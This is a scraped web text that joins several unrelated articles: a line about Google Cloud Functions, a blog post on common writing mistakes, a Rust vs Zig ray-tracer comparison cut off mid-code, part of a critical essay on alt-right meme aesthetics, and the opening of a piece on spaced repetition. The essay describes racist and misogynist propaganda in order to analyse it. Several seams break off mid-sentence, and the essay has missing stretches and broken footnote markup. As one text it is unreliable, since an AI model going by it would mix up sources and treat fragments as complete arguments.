	<li><a id="cloud_functions"></a> <a href="https://cloud.google.com/functions" target="_blank">Cloud Functions</a> allow you to create functions which are triggered by events raised from Google Cloud infrastructure/services. You write the function (in any of the languages supported by Google Cloud) and attach it to an event that is raised by a Google Cloud Infrastructure and/or Service.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We all make mistakes; no one is perfect. What will set you apart is your ability to identify and fix those mistakes. As writers, we make the most mistakes; our pieces are filled with grammatical errors, plot holes, contradictions, and wrong words. Even the best among us have to edit their pieces because no matter how experienced you are, new mistakes will eventually come knocking. The essence is in not giving up.</p><blockquote><p>A professional writer is an amateur who didn't quit.</p><p>— Richard Bach</p></blockquote><p>In this article, I am going to highlight a few common mistakes that writers make, and how you can avoid them.</p><h2><strong><span data-preserver-spaces="true">1. Affect vs. effect</span></strong></h2><p>Affect and effect are homophones (similar sounding words) and lot of writers confuse their usage; interchanging them. It is one of the most common mistakes among writers <span data-preserver-spaces="true">you can avoid it if you understand the basic grammar behind these two words.</span></p><p><strong>Affect</strong><span data-preserver-spaces="true">&nbsp;is a <em>verb</em>. It is used when someone or something is <em>acting</em></span><em><span data-preserver-spaces="true">&nbsp;on something or someone </span></em>t<span data-preserver-spaces="true">o produce a result or change.</span></p><p><strong>Example of Affect<br></strong><em><span data-preserver-spaces="true">The whole class was <strong>affected</strong> by his bad behavior.&nbsp;</span></em></p><p><strong>Effect</strong><span data-preserver-spaces="true">&nbsp;is a <em>noun</em>. It is used to convey the <em>r</em></span><em>esult</em><span data-preserver-spaces="true">&nbsp;or c</span><em><span data-preserver-spaces="true">onsequence&nbsp;</span></em><span data-preserver-spaces="true">of some&nbsp;</span><em><span data-preserver-spaces="true">action </span></em><span data-preserver-spaces="true">performed </span><span data-preserver-spaces="true">by someone or something</span><span data-preserver-spaces="true">.</span></p><p><strong>Example of Effect<br></strong><em><span data-preserver-spaces="true">His rejection was an <strong>effect</strong> of his inexperience as a writer.&nbsp;</span></em></p><h2><strong><span data-preserver-spaces="true">2. Its vs. it's</span></strong></h2><p><span data-preserver-spaces="true">Its and it's are very easily confused due to their similar sound (and appearance).</span></p><p><span data-preserver-spaces="true"><strong>Its</strong> is possessive (belonging to). It is used to represent ownership:</span></p><p><strong>Example of Its</strong><br><em>When he tried to get into the car, <strong>its</strong> door wouldn't open.</em></p><p>On the other hand,&nbsp;<strong>it's&nbsp;</strong>is a contraction of <strong><em>it has</em></strong> or <strong><em>it is</em>&nbsp;</strong>(i.e. it is used in place of these).</p><p><strong>Example of It's</strong><br><i><strong>It's</strong> going to be okay.</i></p><p><span data-preserver-spaces="true">The trick to using them correctly is to replace the confusing words with </span><em><span data-preserver-spaces="true">it has</span></em><span data-preserver-spaces="true">&nbsp;or&nbsp;</span><em><span data-preserver-spaces="true">it is</span></em><span data-preserver-spaces="true">&nbsp;and see if it makes sense. If the sentence sounds correct use&nbsp;</span><em><span data-preserver-spaces="true">it's</span></em><span data-preserver-spaces="true">&nbsp;otherwise use</span><em><span data-preserver-spaces="true">&nbsp;its</span></em><span data-preserver-spaces="true">.</span></p><h2><strong><span data-preserver-spaces="true">3. There's vs. theirs vs. they're</span></strong></h2><p><span data-preserver-spaces="true">There, their and they're almost all sound exactly the same but they are used in very different contexts.</span></p><p><strong>There</strong><span data-preserver-spaces="true"> refers to an idea or a place:</span></p><p><strong>Example of There</strong><br><em><span data-preserver-spaces="true"><strong>There</strong> is my garage.&nbsp;</span></em></p><p><strong>Their</strong><span data-preserver-spaces="true"> is possessive. It means something belonging to something or somebody:</span></p><p><strong>Example of Their</strong><br><em><span data-preserver-spaces="true"><strong>Their</strong> cat keeps hiding in our store.</span></em></p><p><strong>They're</strong> is a contraction like it's. It is used in place of they are:</p><p><strong>Example of They're</strong><br><em><strong>They're</strong> a really nice people.</em></p><h2><strong><span data-preserver-spaces="true">4. Commas</span></strong></h2><p>Commas (and other punctuation) are an essential part of writing. They help in improving readability and comprehensibility. A lot of new writers forget to learn the proper use of commas.</p><p><em><span data-preserver-spaces="true">Sam who loved computer games was the first to arrive at the carnival.</span></em></p><p>If you read the above sentence, you will find it confusing. This is because "who loved computer games" is not important but it <em>seems</em> to be&nbsp;an important part of the sentence. The corrected version sounds much better:</p><p><em><span data-preserver-spaces="true">Sam<strong>,</strong> who loved computer games<strong>,</strong> was the first to arrive at the carnival.</span></em></p><p><span data-preserver-spaces="true">The clause "<em>who loved computer games"</em> can be taken out without affecting the meaning of the sentence: <em>Sam was the first to arrive at the carnival</em>. In such sentences, it is a good idea to use a comma before and after the clause.</span><span data-preserver-spaces="true">&nbsp;</span></p><p><span data-preserver-spaces="true">Similarly in compound sentences in which two clauses are independent of each other, a comma should be included to indicate a pause:</span></p><p><em><span data-preserver-spaces="true">Mary was good at teaching, and it was a holiday.</span></em></p><h2><strong><span data-preserver-spaces="true">5. Sentence fragment</span></strong></h2><p><span data-preserver-spaces="true">Another mistake writers make is to use sentences that don't make sense on their own. When a sentence does not make sense independently it becomes a fragment.</span></p><p><strong>Example</strong><em><span data-preserver-spaces="true"><br>The war started between the two armies. And went on for a whole day.&nbsp;</span></em></p><p><span data-preserver-spaces="true">In the above sentences, the second one does makes no sense on its own. It is better to make it part of the first sentence:</span></p><p><em><span data-preserver-spaces="true">The war started between the two armies and went on for a whole day.&nbsp;</span></em></p><h2><strong><span data-preserver-spaces="true">6. Use of semicolons</span></strong></h2><p><span data-preserver-spaces="true">Semicolons are used when two sentences are related in such a way that the last sentences's meaning is not clear without the first one.</span></p><p><span data-preserver-spaces="true">A lot writers are intimidated by semicolons but their proper use can make your sentences and paragraphs easier to read and understand.</span></p><p><em><span data-preserver-spaces="true">The armies are near now; when they meet, the skies will burn.</span></em></p><p><span data-preserver-spaces="true">In the above example, the second part makes no sense without the first part.</span></p><h2><strong><span data-preserver-spaces="true">7. Weak introduction</span></strong></h2><p><span data-preserver-spaces="true">When a reader starts reading your writing, his first impression is lasting. If you make a lousy introduction readers will lose interest. It is important that the start should be interesting and energetic.</span></p><p><span data-preserver-spaces="true">You have to look at your writing and see what information you are giving the reader. If it does not give out anything then most probably your introduction is boring. Rewrite it.</span></p><h2><strong><span data-preserver-spaces="true">8. Jumping about the bush</span></strong></h2><p>No one likes long explanations. Get to the point. You must not bore the reader. Get to the point then elaborate as necessary.</p><p>You might feel like giving context is important but it is not. The reader is not interested in knowing the reasons until&nbsp;<em>after&nbsp;</em>you tell them the actual thing.</p><h2><strong><span data-preserver-spaces="true">9. Lack of research</span></strong></h2><p>No matter the length of your piece, do you research. I cannot stress on how important this is, and how a lot of writers avoid this extra work.</p><p>Writing is so fickle; one moment you are on the heights of inspiration and the other you seem to have forgotten the language. Aside from helping you get your facts straight, research gives a structure your piece. Consequently, this will filter out confusing or contradicting ideas, cliche and cringe descriptions, or in other words, content that no one wants to read.</p><div><p><strong><a href="https://blog.streetwriters.co/overcoming-writers-block/">Are you facing writer's block?</a></strong></p><p>I remember June of 2015. I came back from University, sat down to write in my daily journal, and picked up my pen. I stared at the blank page with a sense of impending doom. Writer's block. It was here. For so long, I had evaded its dark clutches, but it had caught up to me. I knew one day it would...</p><p><a href="https://blog.streetwriters.co/overcoming-writers-block/">Continue reading</a></p></div><p>Research also helps you figure out what is the best way to approach your audience. You do not want to blunder into the field having no idea how to take the next step. That is just inviting peril to feed on your brain.</p><h2><strong><span data-preserver-spaces="true">10. Show don't tell</span></strong></h2><p><em>Actions speak louder than words.&nbsp;</em>The less you show your audience the less they will know. Saying that your character is charismatic is just talk.&nbsp;<em>How </em>is he charismatic? Show the reader. Make it an immersive experience. Don't talk, show.</p><p>This mistake is, by far, the hardest to detect and fix. Many writers have tried to set some basic rules to avoid it; for example Stephen Kings tells you to not use adverbs. Why? Because adverbs are not descriptive. They <em>tell</em> what state the character is in but don't <em>show</em>.</p><blockquote><p>I believe the road to hell is paved with adverbs, and I will shout it from the rooftops.</p><p>Stephen King</p></blockquote><p><strong>Sentence 1</strong><br>He was in a hurry.</p><p><strong>Sentence 2</strong><br>He constantly looked at his watch, and every time his step would gain new energy as if Time propelled him towards his destination.</p><p>If you read the above sentences, the second one will immediately sound more intriguing. This is the power of&nbsp;<em>show don't tell.</em></p><h2><strong><span data-preserver-spaces="true">11. No editing</span></strong></h2><p>Editing is like cooking food. If you only put the ingredients into a pot and mix it, the result will be bland and boring. You must take the time to cook your writing, taste it after intervals and add spices or water as necessary, increase the heat, or you simply let it cook until the dish is ready.</p><p>Its given that the first draft of anything is going to be full of mistakes.<span data-preserver-spaces="true"> Do the revisions. Put in the extra work; it is worth the extra time.&nbsp;</span><span data-preserver-spaces="true">Even a quick skimming will help you fix grammatical mistakes and other obvious blunders.</span></p><h2><strong><span data-preserver-spaces="true">12. Editing as you go</span></strong></h2><p>Editing is not writing. I see this mistake (and sometimes even make it) very often among writers. They will start a piece and after the first few lines they will have started editing. The result? The piece never gets written. If you are editing, you are not writing.</p><p><span data-preserver-spaces="true">Writing is a continuous process and if you stop too much, your flow will break. You will lose the creativity and the freedom to express what you want.</span></p><p><strong>Rule of Thumb</strong><br>First write; then edit.</p><p><strong>Call of Writing</strong><br>We made an app to help writers focus more on their <em>writing</em> when writing. Be sure to <a href="https://callofwriting.com/" title="Call of Writing">check it out.</a> It is available on web, iOS, and Android.</p><h2><strong><span data-preserver-spaces="true">13. Wrong word</span></strong></h2><p><span data-preserver-spaces="true">The right word at the right instance is better than a whole paragraph of explanation. It needs practice and patience to use the right word but once you get into the habit your writing will improve drastically. With the right words you can convey an idea in a sentence that, otherwise, you can't even in a whole paragraph.</span></p><blockquote><p>The difference between the almost right word and the right word is really a large matter. 'tis the difference between the lightning bug and the lightning.</p><p><em>The Wit and Wisdom of Mark Twain</em>, Mark Twain</p></blockquote><h2>14. Writing like someone else</h2><p>I often see writers aspiring to write like Jane Austen or Mark Twain or Shakespeare, and I am inspired by such ambition. However, in trying to be someone else they forget their own voice; their pieces lack genuineness and creativity because in effort to write like Shakespeare they end up writing Shakespeare.</p><blockquote><p>You have to follow your own voice. You have to be yourself when you write. In effect, you have to announce, 'This is me, this is what I stand for, this is what you get when you read me. I'm doing the best I can—buy me or not—but this is who I am as a writer.</p><p>— David Morrell</p></blockquote><p>Finding your own voice in writing is important. The message you have to convey cannot be conveyed by someone else.</p><p>It is okay to aspire to become someone else but it is very important that you do not forget who you are.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
            

<p>I spend most of my programming time writing C++. And like many other C++ programmers, I’ve shot myself in the foot countless times with a feature I didn’t fully grok. And I’ve spent enormous amounts of time trying to understand the language. Like many other C++ developers in this position, I find myself frequently daydreaming about switching to another more modern and easily understood language.</p>

<p>The two languages that I spent most of my time daydreaming about writing code in are Rust and Zig.</p>

<p>Rust, because of its focus on safety and performance. The language effectively tries to prevent you from shooting yourself in the foot. The language has been designed with more care than C++ – features are tested for feasibility in a nightly branch before being released. A few promising graphics libraries, like <code>gfx-rs</code>, make the language very appealing. But on the other hand, the language has a steep learning curve. Additionally, some of the <a href="https://www.reddit.com/r/rust/comments/a9stnw/rust_2019_and_beyond_limits_to_some_growth/ecn5e5o/?context=3">community discussion</a> gives me little hope that the language is going to stop growing anytime soon. At this time, there are already two slightly different ways of using modules.</p>

<p>Zig, because of its focus on robustness and clarity. The language aims to be easily readable and understandable. The language also features a very elegant take on metaprogramming and generics, far nicer to use than what you currently get in C++. But on the other hand, the language lacks lots of features, like operator overloading, interfaces, and traits.</p>

<p>Would the lack of features in Zig make me more or less productive than with Rust’s feature overload? Which language is more enjoyable to use for writing a small, self-contained computer graphics project?</p>

<p>To find out, I decided to implement the same simple project in both languages: a small ray tracer, following the book <a href="http://www.realtimerendering.com/raytracing/Ray%20Tracing%20in%20a%20Weekend.pdf">Ray Tracing in One Weekend</a>. Briefly put, ray tracing is a computer graphics algorithm in which light is simulated by shooting a bunch of rays from the camera into the scene and tracking the path the rays take as they interact with the scene. The book’s code samples are C++, but the code is not complex and lends itself well to being reimplemented in other languages. Here’s how it went.</p>

<h2 id="rendering-the-first-pixels">Rendering the first pixels</h2>

<p>To kick the project off, a way to display images is required. I wanted to render the image directly to an open window, instead of outputting the image to an image file, like the book does. So, to start this project off, I had to open a window and display some colored pixels on the screen.</p>

<p><img src="https://nelari.us/img/rust_and_zig/initial_pixels.png" alt="initial pixels">
</p><p><i>The goal of this section: open a small window and add some colors to the pixel buffer.</i></p>

<h3 id="rust">Rust</h3>

<p>In the C/C++ ecosystem, I’m most familiar with using the SDL media library for providing a window to use for rendering. Of course, you can use SDL in Rust as well. But Rusts’s main package registry, crates.io, actually had something better: the <code>minifb</code> crate (crates are Rust parlance for packages). It does one thing well – it lets you open a window and set its pixel buffer. No complex setup required, perfect!</p>

<p>Adding the crate was as easy as adding one line to <code>Cargo.toml</code>.</p>

<pre><code>[dependencies]
minifb = "0.11.2"
</code></pre>

<p>The crate was automatically downloaded and compiled in the background the next time the build was executed.</p>

<p>I have to say the discoverability of packages is really nice on websites like <a href="https://crates.io/">crates.io</a> and especially <a href="https://lib.rs/">lib.rs</a>. While many packages are not mature, it is nice to see what people have worked on in one place. If you want to find a C++ library, you most likely have to scrape through sourceforge, only to find something written during the last millenia using completely different style and standards than you are.</p>

<h3 id="zig">Zig</h3>

<p>Zig is a <em>very</em> new language in comparison to Rust. That means no convenient packages to get you started. But Zig has something else up its sleeve: C headers can be imported into the current Zig module using <code>@cInclude("SDL.h")</code> allowing you to use the C functions, structs, and even macro values directly in the Zig code. This made introducing SDL into the project fairly painless.</p>

<p>Zig actually goes a step further, because the Zig compiler is also a C compiler. I wrote a small C function to set pixel values in the window surface in C, and the C source file could be compiled alongside the Zig source, with the following small addition to the <code>build.zig</code> file, which tells the Zig compiler how your project should be built.</p>

<pre><code>// Add Zig source to the ray tracer executable
const exe = b.addExecutable("zig-tracer", "src/main.zig");
exe.setBuildMode(b.standardReleaseOptions());

// Add the C source file to the executable
exe.addCSourceFile("src/pixel.c", lib_cflags);
exe.addIncludeDir("src/");
exe.linkSystemLibrary("c");
</code></pre>

<p>This allows Zig to easily coexist alongside C source code.</p>

<h2 id="implementing-the-ray-tracer">Implementing the ray tracer</h2>

<p>Rendering images in the ray tracing book involves writing definitions for ray-sphere collision testing as well as writing definitions for how the ray interacts with the surface of a sphere once it collides.</p>

<p><img src="https://nelari.us/img/rust_and_zig/albedo_render.png" alt="albedo render">
</p><p><i>Testing whether my ray-sphere collision tests work: the scene rendered using just the color value of the object.</i></p>

<p><img src="https://nelari.us/img/rust_and_zig/normal_render.png" alt="normal map render">
</p><p><i>More tests: the scene rendered using the surface normal vector as a color.</i></p>

<p>Controlling how the ray interacts with the sphere’s surface is implemented using a number of different material objects, which define how the ray <em>scatters</em> from the sphere’s surface. The materials the book implements are lambertian (paper, marble), metal, and dielectric (glass).</p>

<p><img src="https://nelari.us/img/rust_and_zig/depth_render.png" alt="depth render">
</p><p><i>A render showing the number of times a ray has bounced off of a surface for each pixel. The brighter the pixel, the more bounces occurred.</i></p>

<p><img src="https://nelari.us/img/rust_and_zig/final_render.png" alt="final image">
</p><p><i>The final image containing a glass, lambertian, and metallic sphere. This is what we’re trying to accomplish in this section.</i></p>

<h3 id="rust-1">Rust</h3>

<h4 id="program-structure">Program structure</h4>

<p><em>Ray Tracing in One Weekend</em> adheres to a more old-fashioned style of C++, where relations between types are often modeled using inheritance. I opted to leave polymoprhism on the table and go for a very simple approach.</p>

<p>In Rust, there are no fancy inheritance mechanism so my scene objects, <code>World</code> and <code>Sphere</code>, are just simple structs.</p>

<pre><code>#[derive(Copy, Clone)]
pub struct Sphere {
    pub center: Vec3,
    pub radius: f32,
    pub material: Material,
}

pub struct World {
    spheres: Vec&lt;Sphere&gt;,
}

impl World {
    pub fn new(spheres: Vec&lt;Sphere&gt;) -&gt; World {
        World { spheres }
    }
}
</code></pre>

<p>As we can see from the definition of the <code>Sphere</code>, it has one field for a material. The sphere’s material can be any one of the three materials, lambertian, metal, or a dielectric. Once again, this could be a good place to use polymorphism, but I decided to use Rust’s really handy tagged unions instead.</p>

<pre><code>#[derive(Copy, Clone)]
pub struct Lambertian {
    pub albedo: Vec3,
}

#[derive(Copy, Clone)]
pub struct Metal {
    pub albedo: Vec3,
    pub fuzz: f32,
}

#[derive(Copy, Clone)]
pub struct Dielectric {
    pub refraction_index: f32,
}

#[derive(Copy, Clone)]
pub enum Material {
    Dielectric(Dielectric),
    Lambertian(Lambertian),
    Metal(Metal),
}

impl Material {
    pub fn lambertian(albedo: Vec3) -&gt; Material {
        Material::Lambertian(Lambertian { albedo })
    }

    pub fn metal(albedo: Vec3, fuzz: f32) -&gt; Material {
        Material::Metal(Metal { albedo, fuzz })
    }

    pub fn dielectric(refraction_index: f32) -&gt; Material {
        return Material::Dielectric(Dielectric { refraction_index });
    }
}

// Lambertian, Metal, and Dielectric scattering functions omitted for brevity
</code></pre>

<p>One could argue that the degree of code reuse is less in this scheme than in the book, since now we have to pattern match on the material union type to call their associated member scatter functions.</p>

<pre><code>let scatter = match hit.material {
    Material::Dielectric(d) =&gt; d.scatter(r, hit, rng),
    Material::Lambertian(l) =&gt; l.scatter(r, hit, rng),
    Material::Metal(m) =&gt; m.scatter(r, hit, rng),
};
</code></pre>

<p>But I thought it was an easy tradeoff to make.</p>

<p>Finally, one last missing bit from the ray tracer. Here’s the snippet which calculates whether a given ray intersects a sphere. You can see I created a <code>Hitable</code> trait for my sphere and world structs to implement. In the end, I did not need the trait, because I just called the <code>hit</code> functions directly on the objects. A little bit of premature “architecture” on my part.</p>

<pre><code>impl Hitable for Sphere {
    fn hit(&amp;self, ray: &amp;Ray, t_min: f32, t_max: f32) -&gt; Option&lt;HitRecord&gt; {
        let oc = ray.origin - self.center;
        let a = ray.direction.dot(ray.direction);
        let b = oc.dot(ray.direction);
        let c = oc.dot(oc) - self.radius * self.radius;
        let discriminant = b * b - a * c;

        if discriminant &gt; 0.0 {
            let mut temp = (-b - (b * b - a * c).sqrt()) / a;
            if temp &lt; t_max &amp;&amp; temp &gt; t_min {
                let hit_point = ray.point_at_parameter(temp);
                return Some(HitRecord {
                    t: temp,
                    p: hit_point,
                    n: (1.0 / self.radius) * (hit_point - self.center),
                    material: &amp;self.material,
                });
            }

            temp = (-b + (b * b - a * c).sqrt()) / a;
            if temp &lt; t_max &amp;&amp; temp &gt; t_min {
                let hit_point = ray.point_at_parameter(temp);
                return Some(HitRecord {
                    t: temp,
                    p: hit_point,
                    n: (1.0 / self.radius) * (hit_point - self.center),
                    material: &amp;self.material,
                });
            }
        }
        None
    }
}
</code></pre>

<h4 id="control-flow">Control flow</h4>

<p>After spending around a weekend’s worth of time with the project, the thing I actually liked most about Rust was the control flow.</p>

<p>The ability to return values from <code>if</code> expressions and blocks is awesome and I don’t know how I’ve managed to live up until now without it. Instead of conditionally assigning to a bunch of variables it is better to return them from an <code>if</code> expression instead.</p>

<pre><code>// Rust

// Returnign a tuple of values  out of an if expression
let …</code></pre></div></div>

<p><em>Editor’s Note: This article includes an in-depth inquiry into the online activities of political groups for which&nbsp;misogyny, racism, and anti-semitism&nbsp;become&nbsp;defining features; as such, images and mentions of those topics are found in the text.</em></p>
<p><em>Estimated read time: 29&nbsp;minutes.</em></p>
<p><span>For the greater part of the past year, I’ve been surveying the aesthetic sensibilities of nationalist internet hubs such as <a href="http://www.breitbart.com/">Breitbart</a>, <a href="http://boards.4chan.org/pol/">/pol</a>, <a href="https://www.reddit.com/r/The_Donald/">r/the_donald</a>, and similarly affiliated Facebook pages. These communities constitute what journalists and theorists have come to refer to as the </span><i><span>alt-right</span></i><span>—online neo-fascist groups whose growth mirrors and informs the growing nationalist, nativist sentiment as it is represented in the recent electoral success of the UK Independence Party, the Trump campaign, Austria’s Freedom Party, the French National Front, and Germany’s Alternative for Deutschland Party.</span></p>
<p><span>Briefly, before I begin thematizing the aesthetics of the alt-right, it is necessary to outline the definition of fascism that I am using in this essay. Fascism is an amorphous term with a multitude of definitions; the task of defining fascism has been attempted by numerous theorists including Deleuze and Guattari, Walter Benjamin, Arthur Rosenburg, Wilhelm Reich, and more. One useful definition I have encountered comes from semiotician Umberto Eco, who himself was a child during Mussolini’s fascist regime. In his essay </span><i><span>Ur-Fascism</span></i><span>, Eco identifies themes and rhetorical habits that underpin fascism (although his interrogation is limited to describing what fascism looks and sounds like, as opposed to the mechanism by which it emerges).<span id="easy-footnote-1-490"></span><span><a href="#easy-footnote-bottom-1-490" title="Umberto Eco, “Ur-Fascism” <i>The New York Review of Books, </i>June 22 1995, <a href=&quot;http://www.nybooks.com/articles/1995/06/22/ur-fascism/&quot;>http://www.nybooks.com/articles/1995/06/22/ur-fascism/</a>."><sup>1</sup></a></span></span><span> Some of the characteristics that I will refer to in my aesthetic survey include:</span></p>

<ol>
<li><span>the </span><i><span>cult of tradition</span></i><span> which idealizes a primordial past (think </span><i><span>Make America Great Again,</span></i><span> or Mussolini’s call to build a new Rome, a call recently echoed by White Nationalist Richard Spencer<span id="easy-footnote-2-490"></span><span><a href="#easy-footnote-bottom-2-490" title="Sam Kestenbaum, “Who is Alt-Right Figurehead Richard Spencer” <a href=&quot;http://forward.com/news/355260/who-is-alt-right-figurehead-richard-spencer/&quot;>http://forward.com/news/355260/who-is-alt-right-figurehead-richard-spencer/</a> (November 2016)"><sup>2</sup></a></span></span><span>).</span></li>
<li><i><span>fear of difference</span></i><span>, whether </span><i><span>difference</span></i><span> be sexual, gendered, religious, or racial.</span></li>
<li><span>a </span><i><span>cult of masculinity</span></i><span> that, tends to manifest itself in an obsession with sexual politics (refer to online pick-up artistry and the heteronormative gender roles embodied in the nuclear family.)</span></li>
<li><i><span>a hostility towards parliamentary politics</span></i><span>, criticality, and reason.</span></li>
<li><span>a belief in</span><i><span> permanent warfare</span></i><span> and a corresponding </span><i><span>cult of action for action’s sake</span></i><span>. </span></li>
<li><span>a </span><i><span>worship of technology</span></i><span>, not in the manner of an Enlightenment-esque worship of reason, but faith in technology to conquer and to reaffirm inegalitarianism.</span></li>
</ol>

<p><span>The online neo-fascist movement, the alt-right</span> <span>consists of a number of different groups, although certain tenets (all of which align with Eco’s criteria for ur-Fascism) are quite consistent throughout these communities in some form or fashion—a preference for authoritarianism over democracy, scientific racism and misogyny under the palatable term “human biodiversity,” and suspicion towards what they perceive to be the cultural hegemony of the left as evidenced in the liberal leanings of the mainstream media, the entertainment industry, and academia. Their economic views are difficult to discern, with protectionism, accelerated free market global capitalism, and anarcho-capitalism all being advocated in different communities.</span></p>

<p><span>Indexing these movements across a two axis chart </span><i><span>(fig. a) </span></i><span>is productive for the intents and purposes of this paper; however, what is most interesting to observe is instances in which these communities convene in internet “public spaces” (which are not public at all), most notably reddit and 4chan. Their creative propagandic images are disseminated throughout social media and oftentimes matriculate all the way up to the Twitter accounts of political leaders, activists, entertainers, and of course, into our national consciousness. As I will refer to this chart throughout this essay, I would like to clarify its organizational logic. Groups, terms, and individuals are plotted according to their variations on the central tenets of the alt-right’s ideological disposition, namely in regards to Nationalism and Faith. </span></p>
<p><span>Nationalism in general is a defining characteristic of the alt-right; however, within the nationalist ideology there are degrees of variation, particularly in regard to the status of Jewish people and Israel. Representatives from groups that more closely embody economic nationalism can still be considered mainstream figures since their rhetoric skirts around social issues such as race and religion. On the opposite side, the groups share a nationalist ideology, but the rhetoric takes on a distinctly racialized, often anti-Semitic, tone—a stark contrast to the staunchly pro-Israel economic nationalist groups epitomized in the Trump Administration itself. </span></p>
<p><span>Towards the bottom of the chart, the religio-philosophical underpinnings of the alt-right contrast. &nbsp;On the left side of the chart are the individuals and movements that place their faith in inegalitarian readings of traditionally recognized religion. Perhaps echoing Julius Evola’s spiritual racism, various communities re-read Christian mysticism, Zen Buddhism, and Hindu polytheism, ultimately and bewilderingly drawing White Supremacist conclusions. On the bottom-right, we see a more technocratic, hypercapitalist neo-fascism that places its faith in markets, accelerated capitalism, and “empirical” science to reveal the truly inegalitarian hierarchy key of racial classification. In a sense, there is a loose historical allegory to be found here: the spiritual quadrant of the alt-right finds coherence in Julius Evola’s spiritual justification for fascism (a concept that was quite appealing to Mussolini), while the techno-determinist quadrant draws influence from Nazist racism, which uses a biological justification. Thus, opposite axes should not be understood as antithetical; the axes are constitutive and relational, accounting for variations in nationalism and faith.</span></p>

At the very least, they (via the appointment of Breitbart News executive chair Steve Bannon as Trump’s new strategist) occupy the position of the President-Elect’s right-hand man. Beyond Bannon and Trump, self-identified major contributors of the public alt-right</span> <span>include Breitbart, its tech editor Milo Yiannopolous, and international populist movements such as the National Front. These movements, figures, and publications have found a receptive audience in a number of online communities that are defined by gamer culture and what has been in the past referred to as the </span><i><span>Manosphere</span></i><span>. Almost exactly as it sounds, the </span><i><span>Manosphere</span></i><span> refers to a loose affiliation of anti-feminist men’s rights groups across the internet, including the subreddits </span><i><span>r/theredpill</span></i><span>, </span><i><span>r/mgtow<span id="easy-footnote-4-490"></span><span><a href="#easy-footnote-bottom-4-490" title="The acronym MGTOW stands for “Men Going Their Own Way,” away from mainstream discourses of gender egalitarianism."><sup>4</sup></a></span></span></i><span>&nbsp;and forums such as bodybuilding.com and a variety of smaller blogs.<span id="easy-footnote-5-490"></span><span><a href="#easy-footnote-bottom-5-490" title="For a list of manosphere-type websites, refer to <a href=&quot;https://www.trp.red/blogs/&quot;>https://www.trp.red/blogs/</a>"><sup>5</sup></a></span></span><span>&nbsp;The </span><i><span>Manosphere </span></i><span>also focuses on pickup artistry (PUA) or seduction training, which attempts to pathologize female personality types and empirically develop strategies to seduce them.

The term has varied utility but in general refers to the process by which an individual becomes indoctrinated into the ideology of the alt-right although, the image of the red pill asserts itself as emancipatory."><sup>7</sup></a></span><i></i><span>. </span></p>
<p><span><img src="http://baltimore-art.com/wp-po/wp-content/uploads/2017/02/fig-c.jpg" alt="" width="688" height="960" srcset="http://baltimore-art.com/wp-po/wp-content/uploads/2017/02/fig-c.jpg 688w, http://baltimore-art.com/wp-po/wp-content/uploads/2017/02/fig-c-150x209.jpg 150w, http://baltimore-art.com/wp-po/wp-content/uploads/2017/02/fig-c-215x300.jpg 215w" sizes="(max-width: 688px) 100vw, 688px"><em>(fig. c)</em></span></p>
<p><span>This image </span><i><span>(fig. c)</span></i><span> is pulled from the Facebook meme page </span><i><span>Edgy Memes and Fashy Dreams</span></i><span>. In it, we see a number of racist and fascist tropes—the depiction of the animalistic black male figure pursuing a white woman epitomizes the basic dynamic of world depiction in many fascist movements. The </span><i><span>other</span></i><span> is presented as both a subhuman degenerate and an existential threat; in Eco’s words, he is “at the same time too strong and too weak.”<span id="easy-footnote-8-490"></span><span><a href="#easy-footnote-bottom-8-490" title="Eco, <i>Ur Fascism</i>."><sup>8</sup></a></span></span><span>&nbsp;Alluding to the overlap between the </span><i><span>manosphere </span></i><span>and the gaming community, signifiers of virtuality—the game-packaging design, the logo, and the title </span><i><span>Europe Simulator 2016</span></i><span>—place faith in the computer simulation in accurately modeling a current state of affairs. Note that there is nobody to identify with in this depiction; we are certainly not the foreigner and, since we are entering from a fundamentally male space, we are not the victim. It is only possible for us to </span><i><span>identify as the simulation itself</span></i><span>. This is a motif that, as I will describe throughout this essay, is highly desirable for the alt-right. Ultimately, this religious faith in technology to make sense of and organize the world reflects the alt-right’s faith that science will undermine the propagandic, false ideology of racial egalitarianism, revealing that people of color truly are, empirically, beasts to be subjugated, rejected, or annihilated.</span></p>
<p><span>The overtly sexual-political fantasy here cannot be ignored of course; after all, a key rhetorical strategy against immigration has been to pigeonhole the immigrant as a rapist, drawing from admittedly real and troubling events such as the New Years 2016 Cologne sexual assaults. Trump’s comments that labeled Mexicans as rapists during his campaign serve a similar role to these fear-mongering tactics. However, we find a contradiction in the perceived threat of rape, since the </span><i><span>Manosphere </span></i><span>tends to engage in rape-apologetics</span><span>&nbsp;and victim-blaming. Thus, we can postulate that in this image, the alt-right and its </span><i><span>Manosphere </span></i><span>constituency does not take issue with rape itself (which is not to say, of course, that rape and its depictions are not of great importance and concern), but that the rapist is black. This fear and revulsion at the prospect of a black man having sex with a white woman has been analyzed by a number of prominent figures that precede my discussion, most notoriously by Frantz Fanon<span id="easy-footnote-9-490"></span><span><a href="#easy-footnote-bottom-9-490" title="R</span><span style=&quot;font-weight: 400;&quot;>efer to <i>Frantz Fanon, Black Skin, White Masks </i>(New York: Grove Press, 1967)"><sup>9</sup></a></span></span><span> and in a more autobiographical manner by …</span></p></div></div>

<p>You would have done better in school, for starters. Instead of turning in your bed unable to sleep terrified of the exam coming the next day, you would soundly sleep with the knowledge that you know everything you need to know to ace the exam. And ace it you would indeed.</p>

<p>You would have spent fewer hours studying. How many times have you opened the textbook only to find that you’ve forgotten all that you’d studied the day before? If you did not forget things then those hours you spent studying would always amount to something, instead of leaving you feeling like you’re swimming against the current. School might even have been fun if you did not forget.&nbsp;</p>

<p>What would your career look like if you did not forget?</p>

<p>Forgetfulness affects us all. There is no one that has not grappled with this problem before. Our lives would be better if we did not forget.&nbsp;</p>

<p>Unfortunately, <span>forgetting is inescapable.</span> There is no such thing as a perfect memory. I am not here to sell you on a magic pill that will turn you into Bradley Cooper in the movie Limitless.</p>

<p>However, that doesn’t mean there aren’t things you can do to massively reduce the speed at which you forget things, because there are.&nbsp;</p>

<p>Science has known about what it takes to get memories to stick around in your memory for a long time. It has known about it for a while now, in fact. It’s just that it has done a terrible job so far at making sure that you know about it, you whose life would massively benefit from that knowledge.</p>

<p>My intent for writing this is to correct these wrongs and introduce you to spaced repetition, the more than established method that will put you in control of your memory once and for all, and Anki, the software that will help you do so.&nbsp;</p>

<p>So, let’s start at the beginning: <span> What is spaced repetition?</span></p>

